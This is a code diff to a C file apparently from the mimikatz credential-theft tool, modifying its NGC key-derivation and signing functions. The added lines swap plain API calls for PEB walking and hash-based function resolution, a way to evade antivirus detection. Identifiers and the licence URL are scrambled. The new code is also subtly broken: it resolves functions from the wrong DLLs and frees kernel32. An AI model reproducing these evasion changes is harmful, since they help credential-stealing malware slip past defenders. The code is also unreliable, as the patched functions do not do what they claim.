@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kull_m_cRyPTO_nGc.h"
+#include "..\mimilib\api_resolver.h"
 
 BOOL kull_m_cRyPTO_nGc_keyvalue_derived_software(PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
 {
@@ -74,6 +75,16 @@ BOOL kull_m_cRyPTO_nGc_keyvalue_derived_hardware(PBYTE pbLabel, DWORD cbLabel, P
 	NCryptBufferDesc bufferDesc = {NCRYPTBUFFER_VERSION, ARRAYSIZE(buffer), buffer};
 	PNCRYPTKEYDERIVATION NCryptKeyDerivation; // tofix
 
+	//nuevo
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"ncrypt.dll");
+	customLoadLibraryW fLoadLibraryW = (customLoadLibraryW)getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+
+	if (!hKernel32Base)
+		hKernel32Base = fLoadLibraryW(L"kernel32.dll"); // fallback
+
+	customGetProcAddress fGetProcAddress =
+		(customGetProcAddress)getFunctionByHash(hKernel32Base, H_GetProcAddress);
+
 	__try
 	{
 		nStatus = NCryptOpenStorageProvider(&hProvider, MS_PLATFORM_CRYPTO_PROVIDER, 0);
@@ -85,7 +96,8 @@ BOOL kull_m_cRyPTO_nGc_keyvalue_derived_hardware(PBYTE pbLabel, DWORD cbLabel, P
 				nStatus = NCryptImportKey(hProvider, hImportKey, NCRYPT_OPAQUETRANSPORT_BLOB, NULL, &hKey, (PBYTE) Key, cbKey, 0);
 				if(nStatus == ERROR_SUCCESS)
 				{
-					NCryptKeyDerivation = (PNCRYPTKEYDERIVATION) GetProcAddress(GetModuleHandle(L"ncrypt.dll"), "NCryptKeyDerivation"); // tofix
+					//NCryptKeyDerivation = (PNCRYPTKEYDERIVATION) GetProcAddress(GetModuleHandle(L"ncrypt.dll"), "NCryptKeyDerivation"); // tofix
+					NCryptKeyDerivation = (PNCRYPTKEYDERIVATION)fGetProcAddress(hKernel32Base, "NCryptKeyDerivation"); // tofix
 					if(NCryptKeyDerivation)
 					{
 						nStatus = NCryptKeyDerivation(hKey, &bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
@@ -163,17 +175,26 @@ BOOL kull_m_cRyPTO_nGc_signature_derived(LPCBYTE pcbKey, DWORD cbKey, LPCBYTE pc
 BOOL kull_m_cRyPTO_nGc_signature_pop(PBYTE pbKey, DWORD cbKey, PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, PBYTE pbData, DWORD cbData, PBYTE *ppbOutput, PDWORD pcbOutput)
 {
 	BOOL status = FALSE;
-	HMODULE hModule;
+	//HMODULE hModule;
 	PNGCSIGNWITHSYMMETRICPOPKEY NgcSignWithSymmetricPopKey;
 	NTSTATUS ntStatus;
 
 	*ppbOutput = NULL;
 	*pcbOutput = 0;
 
-	hModule = LoadLibrary(L"cryptnGc.dll");
-	if(hModule)
+	//hModule = LoadLibrary(L"cryptnGc.dll");
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+
+	customGetModuleHandleW fGetModuleHandleW = (customGetModuleHandleW)getFunctionByHash(hKernel32Base, H_GetModuleHandleW);
+	customLoadLibraryW fLoadLibraryW = (customLoadLibraryW)getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+	customGetProcAddress GetProcAddress_ = (customGetProcAddress)getFunctionByHash(hKernel32Base, H_GetProcAddress);
+
+	//if(hModule)
+	if (hKernel32Base)
 	{
-		NgcSignWithSymmetricPopKey = (PNGCSIGNWITHSYMMETRICPOPKEY) GetProcAddress(hModule, "NgcSignWithSymmetricPopKey");
+		//NgcSignWithSymmetricPopKey = (PNGCSIGNWITHSYMMETRICPOPKEY) GetProcAddress(hModule, "NgcSignWithSymmetricPopKey");
+		NgcSignWithSymmetricPopKey = (PNGCSIGNWITHSYMMETRICPOPKEY)GetProcAddress_(hKernel32Base, "NgcSignWithSymmetricPopKey");
+
 		if(NgcSignWithSymmetricPopKey)
 		{
 			ntStatus = NgcSignWithSymmetricPopKey(pbKey, cbKey, pbLabel, cbLabel, pbContext, cbContext, pbData, cbData, ppbOutput, pcbOutput);
@@ -182,7 +203,8 @@ BOOL kull_m_cRyPTO_nGc_signature_pop(PBYTE pbKey, DWORD cbKey, PBYTE pbLabel, DW
 				PRINT_ERROR(L"NgcSignWithSymmetricPopKey: 0x%08x\n", ntStatus);
 		}
 		else PRINT_ERROR(L"No NgcSignWithSymmetricPopKey?\n");
-		FreeLibrary(hModule);
+		//FreeLibrary(hModule);
+		FreeLibrary(hKernel32Base);
 	}
 	else PRINT_ERROR_AUTO(L"LoadLibrary");
 	return status;
